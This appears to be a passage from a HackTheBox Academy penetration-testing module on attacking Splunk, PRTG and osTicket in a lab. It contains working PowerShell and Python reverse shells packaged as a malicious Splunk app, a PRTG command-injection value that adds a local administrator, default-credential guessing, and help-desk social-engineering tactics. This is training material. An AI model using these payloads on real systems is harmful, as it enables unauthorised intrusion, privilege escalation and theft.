<p>The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as <code>admin</code>, <code>Welcome</code>, <code>Welcome1</code>, <code>Password123</code>, etc.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/splunk\_login.png" alt="image"></p>
<p>We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap identified the <code>Splunkd httpd</code> service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.</p>
<p>Splunk - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap -sV <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.50</span>

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-22</span> <span class="hljs-number">08</span>:<span class="hljs-number">43</span> EDT
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.50</span>
Host is up (<span class="hljs-number">0.11</span>s latency).
Not shown: <span class="hljs-number">991</span> closed ports
PORT     STATE SERVICE       VERSION
<span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft IIS httpd <span class="hljs-number">10.0</span>
<span class="hljs-number">135</span>/tcp  <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">139</span>/tcp  <span class="hljs-built_in">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="hljs-number">445</span>/tcp  <span class="hljs-built_in">open</span>  microsoft-ds?
<span class="hljs-number">3389</span>/tcp <span class="hljs-built_in">open</span>  ms-wbt-server Microsoft Terminal Services
<span class="hljs-number">5357</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)
<span class="hljs-number">8000</span>/tcp <span class="hljs-built_in">open</span>  ssl/<span class="hljs-keyword">http</span>      Splunkd httpd
<span class="hljs-number">8080</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Indy httpd <span class="hljs-number">17.3</span><span class="hljs-number">.33</span><span class="hljs-number">.2830</span> (Paessler PRTG bandwidth monitor)
<span class="hljs-number">8089</span>/tcp <span class="hljs-built_in">open</span>  ssl/<span class="hljs-keyword">http</span>      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">39.22</span> <span class="hljs-built_in">seconds</span>
</code></pre>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment. Some organizations may opt for the free version due to budget constraints, not fully understanding the implications of having no user/role management.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/license\_group.png" alt="image"></p>
<p>Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/splunk\_home.png" alt=""></p>
<p>Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk.</p>
<p>As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We&#39;ll cover this in the next section.</p>
<p>Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this <a href="https://www.exploit-db.com/exploits/40895">SSRF</a> that could be used to gain unauthorized access to the Splunk REST API. At the time of writing, Splunk has <a href="https://www.cvedetails.com/vulnerability-list/vendor\_id-10963/Splunk.html">47</a> CVEs. If we perform a vulnerability scan against Splunk during a penetration test, we will often see many non-exploitable vulnerabilities returned. This is why it is important to understand how to abuse built-in functionality.</p>
<h2 id="attacking-splunk">Attacking Splunk</h2>
<hr>
<p>As discussed in the previous section, we can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts. From the Nmap discovery scan, we noticed that our target is a Windows server. Since Splunk comes with Python installed, we can create a custom Splunk application that gives us remote code execution using Python or a PowerShell script.</p>
<hr>
<h3 id="abusing-built-in-functionality">Abusing Built-In Functionality</h3>
<p>We can use <a href="https://github.com/0xjpuff/reverse\_shell\_splunk">this</a> Splunk package to assist us. The <code>bin</code> directory in this repo has examples for <a href="https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py">Python</a> and <a href="https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1">PowerShell</a>. Let&#39;s walk through this step-by-step.</p>
<p>To achieve this, we first need to create a custom Splunk application using the following directory structure.</p>
<p>Attacking Splunk</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ tree splunk_shell/</span>

splunk_shell/
├── bin
└── <span class="hljs-keyword">default</span>

<span class="hljs-number">2</span> directories, <span class="hljs-number">0</span> files
</code></pre>
<p>The <code>bin</code> directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our <code>inputs.conf</code> file. Our reverse shell will be a PowerShell one-liner.</p>
<p>Attacking Splunk</p>
<pre><code class="lang-powershell-session">#A simple and small reverse <span class="hljs-keyword">shell</span>. Options and <span class="hljs-keyword">help</span> removed to <span class="hljs-keyword">save</span> space. 
#Uncomment and change the hardcoded IP address and port number <span class="hljs-keyword">in</span> the below <span class="hljs-keyword">line</span>. Remove all <span class="hljs-keyword">help</span> comments <span class="hljs-keyword">as</span> well.
<span class="hljs-variable">$client</span> = New-Object System.<span class="hljs-keyword">Net</span>.Sockets.TCPClient('10.10.14.15',443);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%{0};<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.<span class="hljs-keyword">Read</span>(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0){;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | <span class="hljs-keyword">Out</span>-String );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + 'PS ' + (<span class="hljs-keyword">pwd</span>).Path + '&gt; ';<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()};<span class="hljs-variable">$client</span>.<span class="hljs-keyword">Close</span>()
</code></pre>
<p>The <a href="https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf">inputs.conf</a> file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.</p>
<p>Attacking Splunk</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">cat</span> inputs.<span class="hljs-keyword">conf</span> 

[<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:</span>//./bin/rev.<span class="hljs-keyword">py</span>]
disabled = <span class="hljs-number">0</span>  
interval = <span class="hljs-number">10</span>  
sourcetype = <span class="hljs-keyword">shell</span> 

[<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:</span>//.\bin\run.bat]
disabled = <span class="hljs-number">0</span>
sourcetype = <span class="hljs-keyword">shell</span>
interval = <span class="hljs-number">10</span>
</code></pre>
<p>We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.</p>
<p>Attacking Splunk</p>
<pre><code class="lang-shell-session">@<span class="hljs-built_in">ECHO</span> OFF
PowerShell.exe -<span class="hljs-built_in">exec</span> bypass -w hidden -Command <span class="hljs-string">"&amp; '%~dpn0.ps1'"</span>
<span class="hljs-keyword">Exit</span>
</code></pre>
<p>Once the files are created, we can create a tarball or <code>.spl</code> file.</p>
<p>Attacking Splunk</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tar -cvzf updater<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev<span class="hljs-selector-class">.py</span>
splunk_shell/bin/run<span class="hljs-selector-class">.bat</span>
splunk_shell/bin/run<span class="hljs-selector-class">.ps1</span>
splunk_shell/default/
splunk_shell/default/inputs.conf
</code></pre>
<p>The next step is to choose <code>Install app from file</code> and upload the application.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/install\_app.png" alt=""></p>
<p>Before uploading the malicious custom app, let&#39;s start a listener using Netcat or <a href="https://linux.die.net/man/1/socat">socat</a>.</p>
<p>Attacking Splunk</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nc -lnvp <span class="hljs-number">443</span>

listening on [any] <span class="hljs-number">443</span> ...
</code></pre>
<p>On the <code>Upload app</code> page, click on browse, choose the tarball we created earlier and click <code>Upload</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/upload\_app.png" alt=""></p>
<p>As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to <code>Enabled</code>.</p>
<p>Attacking Splunk</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nc -lnvp <span class="hljs-number">443</span>

listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">443</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">201.50</span>] <span class="hljs-number">53145</span>


PS C:<span class="hljs-string">\Windows\system32&gt;</span> whoami

nt authority<span class="hljs-string">\system</span>


PS C:<span class="hljs-string">\Windows\system32&gt;</span> hostname

APP03


PS C:<span class="hljs-string">\Windows\system32&gt;</span>
</code></pre>
<p>In this case, we got a shell back as <code>NT AUTHORTY\SYSTEM</code>. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain.</p>
<p>If we were dealing with a Linux host, we would need to edit the <code>rev.py</code> Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> sys,socket,os,pty

<span class="hljs-title">ip</span>=<span class="hljs-string">"10.10.14.15"</span>
<span class="hljs-keyword">port</span>="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
</code></pre>
<p>If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the <code>$SPLUNK_HOME/etc/deployment-apps</code> directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.</p>
<h2 id="prtg-network-monitor">PRTG Network Monitor</h2>
<hr>
<p><a href="https://www.paessler.com/prtg">PRTG Network Monitor</a> is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more. The first version of PRTG was released in 2003. In 2015 a free version of PRTG was released, restricted to 100 sensors that can be used to monitor up to 20 hosts. It works with an autodiscovery mode to scan areas of a network and create a device list. Once this list is created, it can gather further information from the detected devices using protocols such as ICMP, SNMP, WMI, NetFlow, and more. Devices can also communicate with the tool via a REST API. The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS. A few interesting data points about PRTG:</p>
<ul>
<li>According to the company, it is used by 300,000 users worldwide</li>
<li>The company that makes the tool, Paessler, has been creating monitoring solutions since 1997</li>
<li>Some organizations that use PRTG to monitor their networks include the Naples International Airport, Virginia Tech, 7-Eleven, and <a href="https://www.paessler.com/company/casestudies">more</a></li>
</ul>
<p>Over the years, PRTG has suffered from <a href="https://www.cvedetails.com/vulnerability-list/vendor\_id-5034/product\_id-35656/Paessler-Prtg-Network-Monitor.html">26 vulnerabilities</a> that were assigned CVEs. Of all of these, only four have easy-to-find public exploit PoCs, two cross-site scripting (XSS), one Denial of Service, and one authenticated command injection vulnerability which we will cover in this section. It is rare to see PRTG exposed externally, but we have often come across PRTG during internal penetration tests. The HTB weekly release box <a href="https://0xdf.gitlab.io/2019/06/29/htb-netmon.html">Netmon</a> showcases PRTG.</p>
<hr>
<h3 id="discovery-footprinting-enumeration">Discovery/Footprinting/Enumeration</h3>
<p>We can quickly discover PRTG from an Nmap scan. It can typically be found on common web ports such as 80, 443, or 8080. It is possible to change the web interface port in the Setup section when logged in as an admin.</p>
<p>PRTG Network Monitor</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap -sV -p- <span class="hljs-comment">--open -T4 10.129.201.50</span>

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-22</span> <span class="hljs-number">15</span>:<span class="hljs-number">41</span> EDT
Stats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="hljs-number">0.06</span>% done
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.50</span>
Host is up (<span class="hljs-number">0.11</span>s latency).
Not shown: <span class="hljs-number">65492</span> closed ports, <span class="hljs-number">24</span> filtered ports
Some closed ports may be reported <span class="hljs-keyword">as</span> filtered due <span class="hljs-built_in">to</span> <span class="hljs-comment">--defeat-rst-ratelimit</span>
PORT      STATE SERVICE       VERSION
<span class="hljs-number">80</span>/tcp    <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft IIS httpd <span class="hljs-number">10.0</span>
<span class="hljs-number">135</span>/tcp   <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">139</span>/tcp   <span class="hljs-built_in">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="hljs-number">445</span>/tcp   <span class="hljs-built_in">open</span>  microsoft-ds?
<span class="hljs-number">3389</span>/tcp  <span class="hljs-built_in">open</span>  ms-wbt-server Microsoft Terminal Services
<span class="hljs-number">5357</span>/tcp  <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)
<span class="hljs-number">5985</span>/tcp  <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)
<span class="hljs-number">8000</span>/tcp  <span class="hljs-built_in">open</span>  ssl/<span class="hljs-keyword">http</span>      Splunkd httpd
<span class="hljs-number">8080</span>/tcp  <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Indy httpd <span class="hljs-number">17.3</span><span class="hljs-number">.33</span><span class="hljs-number">.2830</span> (Paessler PRTG bandwidth monitor)
<span class="hljs-number">8089</span>/tcp  <span class="hljs-built_in">open</span>  ssl/<span class="hljs-keyword">http</span>      Splunkd httpd
<span class="hljs-number">47001</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)
<span class="hljs-number">49664</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">49665</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">49666</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">49667</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">49668</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">49669</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">49676</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
<span class="hljs-number">49677</span>/tcp <span class="hljs-built_in">open</span>  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">97.17</span> <span class="hljs-built_in">seconds</span>
</code></pre>
<p>From the Nmap scan above, we can see the service <code>Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)</code> detected on port 8080.</p>
<p>PRTG also shows up in the EyeWitness scan we performed earlier. Here we can see that EyeWitness lists the default credentials <code>prtgadmin:prtgadmin</code>. They are typically pre-filled on the login page, and we often find them unchanged. Vulnerability scanners such as Nessus also have <a href="https://www.tenable.com/plugins/nessus/51874">plugins</a> that detect the presence of PRTG.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/prtg\_eyewitness.png" alt="image"></p>
<p>Once we have discovered PRTG, we can confirm by browsing to the URL and are presented with the login page.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/prtg\_login.png" alt=""></p>
<p>From the enumeration we performed so far, it seems to be PRTG version <code>17.3.33.2830</code> and is likely vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-9276">CVE-2018-9276</a> which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39. Based on the version reported by Nmap, we can assume that we are dealing with a vulnerable version. Using <code>cURL</code> we can see that the version number is indeed <code>17.3.33.283</code>.</p>
<p>PRTG Network Monitor</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s http://<span class="hljs-number">10.129</span>.<span class="hljs-number">201.50</span>:<span class="hljs-number">8080</span>/index.htm -A <span class="hljs-string">"Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)"</span> | grep version

  &lt;link rel=<span class="hljs-string">"stylesheet"</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"text/css"</span> href=<span class="hljs-string">"/css/prtgmini.css?prtgversion=17.3.33.2830__"</span> media=<span class="hljs-string">"print,screen,projection"</span> /&gt;
&lt;div&gt;&lt;h3&gt;&lt;a target=<span class="hljs-string">"_blank"</span> href=<span class="hljs-string">"https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors"</span>&gt;<span class="hljs-keyword">New</span> PRTG <span class="hljs-keyword">release</span> <span class="hljs-number">21.3</span>.<span class="hljs-number">70</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">new</span> Azure, HPE, <span class="hljs-keyword">and</span> Redfish sensors&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Just a short <span class="hljs-keyword">while</span> ago, I introduced you <span class="hljs-keyword">to</span> PRTG <span class="hljs-keyword">Release</span> <span class="hljs-number">21.3</span>.<span class="hljs-number">69</span>, <span class="hljs-keyword">with</span> a load <span class="hljs-keyword">of</span> <span class="hljs-keyword">new</span> sensors, <span class="hljs-keyword">and</span> now the <span class="hljs-keyword">next</span> version <span class="hljs-keyword">is</span> ready <span class="hljs-keyword">for</span> installation. <span class="hljs-keyword">And</span> this version also comes <span class="hljs-keyword">with</span> brand <span class="hljs-keyword">new</span> stuff!&lt;/p&gt;&lt;/div&gt;
    &lt;span class=<span class="hljs-string">"prtgversion"</span>&gt;&amp;nbsp;PRTG Network Monitor <span class="hljs-number">17.3</span>.<span class="hljs-number">33.2830</span> &lt;/span&gt;
</code></pre>
<p>Our first attempt to log in with the default credentials fails, but a few tries later, we are in with <code>prtgadmin:Password123</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/prtg\_logged\_in.png" alt=""></p>
<hr>
<h3 id="leveraging-known-vulnerabilities">Leveraging Known Vulnerabilities</h3>
<p>Once logged in, we can explore a bit, but we know that this is likely vulnerable to a command injection flaw so let&#39;s get right to it. This excellent <a href="https://www.codewatch.org/blog/?p=453">blog post</a> by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it. When creating a new notification, the <code>Parameter</code> field is passed directly into a PowerShell script without any type of input sanitization.</p>
<p>To begin, mouse over <code>Setup</code> in the top right and then the <code>Account Settings</code> menu and finally click on <code>Notifications</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/prtg\_notifications.png" alt=""></p>
<p>Next, click on <code>Add new notification</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/prtg\_add.png" alt=""></p>
<p>Give the notification a name and scroll down and tick the box next to <code>EXECUTE PROGRAM</code>. Under <code>Program File</code>, select <code>Demo exe notification - outfile.ps1</code> from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering <code>test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add</code>. During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the <code>Save</code> button.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/prtg\_execute.png" alt="image"></p>
<p>After clicking <code>Save</code>, we will be redirected to the <code>Notifications</code> page and see our new notification named <code>pwn</code> in the list.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/prtg\_pwn.png" alt=""></p>
<p>Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up. This could prove handy as a persistence mechanism during a long-term engagement and is worth taking note of. Schedules can be modified in the account settings menu if we want to set it up to run at a specific time every day to get our connection back or something of that nature. At this point, all that is left is to click the <code>Test</code> button to run our notification and execute the command to add a local admin user. After clicking <code>Test</code> we will get a pop-up that says <code>EXE notification is queued up</code>. If we receive any sort of error message here, we can go back and double-check the notification settings.</p>
<p>Since this is a blind command execution, we won&#39;t get any feedback, so we&#39;d have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. We can use <code>CrackMapExec</code> to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> or something from the <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> toolkit such as <code>wmiexec.py</code> or <code>psexec.py</code>.</p>
<p>PRTG Network Monitor</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo crackmapexec smb <span class="hljs-number">10.129.201.50</span> -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         <span class="hljs-number">10.129.201.50</span>   <span class="hljs-number">445</span>    APP03            <span class="hljs-string">[*]</span> Windows <span class="hljs-number">10</span>.<span class="hljs-number">0</span> Build <span class="hljs-number">17763</span> (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">10.129.201.50</span>   <span class="hljs-number">445</span>    APP03            <span class="hljs-string">[+]</span> APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
</code></pre>
<p>And we confirm local admin access on the target! Work through the example and replicate all of the steps on your own against the target system. Challenge yourself to also leverage the command injection vulnerability to obtain a reverse shell connection from the target.</p>
<hr>
<h3 id="onwards">Onwards</h3>
<p>Now that we&#39;ve covered Splunk and PRTG let&#39;s move on and discuss some common customer service management and configuration management tools and see how we can abuse them during our engagements.</p>
<h2 id="osticket">osTicket</h2>
<hr>
<p><a href="https://osticket.com/">osTicket</a> is an open-source support ticketing system. It can be compared to systems such as Jira, OTRS, Request Tracker, and Spiceworks. osTicket can integrate user inquiries from email, phone, and web-based forms into a web interface. osTicket is written in PHP and uses a MySQL backend. It can be installed on Windows or Linux. Though there is not a considerable amount of market information readily available about osTicket, a quick Google search for <code>Helpdesk software - powered by osTicket</code> returns about 44,000 results, many of which look to be companies, school systems, universities, local government, etc., using the application. osTicket was even shown briefly in the show <a href="https://forum.osticket.com/d/86225-osticket-on-usas-mr-robot-s01e08">Mr. Robot</a>.</p>
<p>Aside from learning about enumerating and attacking osTicket, the purpose of this section is also to introduce you to the world of support ticketing systems and why they should not be overlooked during our assessments.</p>
<hr>
<h3 id="footprinting-discovery-enumeration">Footprinting/Discovery/Enumeration</h3>
<p>Looking back at our EyeWitness scan from earlier, we notice a screenshot of an osTicket instance which also shows that a cookie named <code>OSTSESSID</code> was set when visiting the page.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/osticket\_eyewitness.png" alt="image"></p>
<p>Also, most osTicket installs will showcase the osTicket logo with the phrase <code>powered by</code> in front of it in the page&#39;s footer. The footer may also contain the words <code>Support Ticket System</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/osticket\_main.png" alt=""></p>
<p>An Nmap scan will just show information about the webserver, such as Apache or IIS, and will not help us footprint the application.</p>
<p><code>osTicket</code> is a web application that is highly maintained and serviced. If we look at the <a href="https://www.cvedetails.com/vendor/2292/Osticket.html">CVEs</a> found over decades, we will not find many vulnerabilities and exploits that osTicket could have. This is an excellent example to show how important it is to understand how a web application works. Even if the application is not vulnerable, it can still be used for our purposes. Here we can break down the main functions into the layers:</p>
<table>
<thead>
<tr>
<th><code>1. User input</code></th>
<th><code>2. Processing</code></th>
<th><code>3. Solution</code></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p><strong>User Input</strong></p>
<p>The core function of osTicket is to inform the company&#39;s employees about a problem so that a problem can be solved with the service or other components. A significant advantage we have here is that the application is open-source. Therefore, we have many tutorials and examples available to take a closer look at the application. For instance, from the osTicket <a href="https://docs.osticket.com/en/latest/Getting%20Started/Post-Installation.html">documentation</a>, we can see that only staff and users with administrator privileges can access the admin panel. So if our target company uses this or a similar application, we can cause a problem and &quot;play dumb&quot; and contact the company&#39;s staff. The simulated &quot;lack of&quot; knowledge about the services offered by the company in combination with a technical problem is a widespread social engineering approach to get more information from the company.</p>
<p><strong>Processing</strong></p>
<p>As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production. Suppose staff and administrators suspect that there is an internal bug that may be affecting the business. In that case, they will go into more detail to uncover possible code errors and address more significant issues.</p>
<p><strong>Solution</strong></p>
<p>Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence. This will give us new email addresses to use against the osTicket admin panel (in the worst case) and potential usernames with which we can perform OSINT on or try to apply to other company services.</p>
<hr>
<h3 id="attacking-osticket">Attacking osTicket</h3>
<p>A search for osTicket on exploit-db shows various issues, including remote file inclusion, SQL injection, arbitrary file upload, XSS, etc. osTicket version 1.14.1 suffers from <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-24881">CVE-2020-24881</a> which was an SSRF vulnerability. If exploited, this type of flaw may be leveraged to gain access to internal resources or perform internal port scanning.</p>
<p>Aside from web application-related vulnerabilities, support portals can sometimes be used to obtain an email address for a company domain, which can be used to sign up for other exposed applications requiring an email verification to be sent. As mentioned earlier in the module, this is illustrated in the HTB weekly release box <a href="https://0xdf.gitlab.io/2021/05/22/htb-delivery.html">Delivery</a> with a video walkthrough <a href="https://www.youtube.com/watch?v=gbs43E71mFM">here</a>.</p>
<p>Let&#39;s walk through a quick example, which is related to this <a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">excellent blog post</a> which <a href="https://twitter.com/ippsec">@ippsec</a> also mentioned was an inspiration for his box Delivery which I highly recommend checking out after reading this section.</p>
<p>Suppose we find an exposed service such as a company&#39;s Slack server or GitLab, which requires a valid company email address to join. Many companies have a support email such as <code>support@inlanefreight.local</code>, and emails sent to this are available in online support portals that may range from Zendesk to an internal custom tool. Furthermore, a support portal may assign a temporary internal email address to a new ticket so users can quickly check its status.</p>
<p>If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/new\_ticket.png" alt=""></p>
<p>This is a modified version of osTicket as an example, but we can see that an email address was provided.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/ticket\_email.png" alt=""></p>
